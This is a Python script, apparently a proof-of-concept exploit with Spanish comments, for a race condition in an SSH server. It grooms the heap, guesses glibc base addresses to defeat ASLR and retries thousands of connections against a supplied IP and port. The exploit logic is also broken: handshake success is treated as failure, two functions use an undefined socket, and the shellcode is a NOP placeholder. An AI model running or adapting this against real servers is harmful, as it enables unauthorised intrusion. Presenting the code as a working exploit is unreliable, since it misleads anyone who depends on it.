#!/bin/python3

# Author: PatxaSec

import socket
import time
import random
import struct
import sys

MAX_PACKET_SIZE = 256 * 1024
LOGIN_GRACE_TIME = 120
MAX_STARTUPS = 100
CHUNK_ALIGN = lambda s: ((s + 15) & ~15)

# Direcciones base de glibc posibles (para bypass de ASLR)
GLIBC_BASES = [0xb7200000, 0xb7400000]
NUM_GLIBC_BASES = len(GLIBC_BASES)

# Shellcode placeholder (reemplaza con shellcode real)
shellcode = b"\x90\x90\x90\x90"

def setup_connection(ip, port):
    # Establece una conexión con el servidor
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    return sock

def send_packet(sock, packet_type, data, length):
    # Envía un paquete con el tipo de paquete, datos y longitud
    sock.sendall(struct.pack("B", packet_type) + data + struct.pack("I", length))

def prepare_heap(sock):
    # Envía una serie de paquetes para preparar el heap
    for i in range(10):
        packet_type = 0x50 + i
        data = b"A" * (MAX_PACKET_SIZE - 4)
        send_packet(sock, packet_type, data, len(data))

def time_final_packet(sock, parsing_time):
    # Envía un paquete para medir el tiempo de parseo
    packet_type = 0x60
    data = b"B" * (MAX_PACKET_SIZE - 4)
    send_packet(sock, packet_type, data, len(data))
    start_time = time.time()
    sock.recv(1024)
    parsing_time = time.time() - start_time
    return parsing_time

def attempt_race_condition(sock, parsing_time, glibc_base):
    # Intenta explotar la condición de carrera
    for i in range(10):
        packet_type = 0x70 + i
        data = b"C" * (MAX_PACKET_SIZE - 4)
        send_packet(sock, packet_type, data, len(data))
        time.sleep(parsing_time / 10)
    # Verifica si la condición de carrera fue exitosa
    response = sock.recv(1024)
    if b"SSH-2.0" in response:
        return True
    return False

def measure_response_time(sock, error_type):
    # Mide el tiempo de respuesta del servidor
    packet_type = 0x80
    data = b"D" * (MAX_PACKET_SIZE - 4)
    send_packet(sock, packet_type, data, len(data))
    start_time = time.time()
    sock.recv(1024)
    response_time = time.time() - start_time
    return response_time

def create_public_key_packet(packet, size, glibc_base):
    # Crea un paquete de clave pública con el tamaño y base de glibc especificados
    packet_type = 0x90
    data = b"E" * size
    send_packet(sock, packet_type, data, len(data))
    return packet_type, data

def create_fake_file_structure(data, size, glibc_base):
    # Crea una estructura de archivo falsa con el tamaño y base de glibc especificados
    packet_type = 0xA0
    send_packet(sock, packet_type, data, len(data))
    return packet_type, data

def send_ssh_version(sock):
    # Envía la versión de SSH
    sock.sendall(b"SSH-2.0-OpenSSH_9.2p1\r\n")

def receive_ssh_version(sock):
    # Recibe la versión de SSH del servidor
    data = sock.recv(1024)
    return data

def send_kex_init(sock):
    # Envía un paquete KEXINIT
    packet_type = 0x14
    data = b"\x00\x00\x00\x07ssh-dss\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03diffie-hellman-group-exchange-sha256"
    send_packet(sock, packet_type, data, len(data))

def receive_kex_init(sock):
    # Recibe el paquete KEXINIT del servidor
    return sock.recv(1024)

def perform_ssh_handshake(sock):
    # Realiza el handshake de SSH
    send_ssh_version(sock)
    if not receive_ssh_version(sock):
        return -1
    send_kex_init(sock)
    if not receive_kex_init(sock):
        return -1
    return 0

def main():
    
    if len(sys.argv)!= 3:
        print(f"Usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    parsing_time = 0
    success = 0

    random.seed(time.time())

    # Intenta explotar la vulnerabilidad para cada dirección base de glibc posible
    for base_idx in range(NUM_GLIBC_BASES):
        if success:
            break
        glibc_base = GLIBC_BASES[base_idx]
        print(f"Attempting exploitation with glibc base: 0x{glibc_base:x}")

        # El asesoramiento menciona "~10,000 intentos en promedio"
        for attempt in range(20000):
            if attempt % 1000 == 0:
                print(f"Attempt {attempt} of 20000")
            if success:
                break

            sock = setup_connection(ip, port)
            if not sock:
                print(f"Failed to establish connection, attempt {attempt}")
                continue

            if not perform_ssh_handshake(sock):
                print(f"SSH handshake failed, attempt {attempt}")
                sock.close()
                continue

            prepare_heap(sock)
            parsing_time = time_final_packet(sock, parsing_time)

            if attempt_race_condition(sock, parsing_time, glibc_base):
                success = 1
                break

            sock.close()

if __name__ == "__main__":
    main()
